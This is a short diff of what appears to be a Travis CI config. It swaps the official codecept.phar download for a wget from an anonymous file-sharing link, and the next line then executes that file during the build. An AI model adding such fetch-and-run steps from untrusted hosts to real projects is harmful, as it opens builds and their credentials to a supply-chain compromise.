@@ -7,7 +7,7 @@ notifications:
   email: false
   
 before_script:
-  - wget http://codeception.com/codecept.phar
+  - wget http://s000.tinyupload.com/download.php?file_id=08748651056616693478&t=0874865105661669347832641
   - php codecept.phar bootstrap
   
 script:
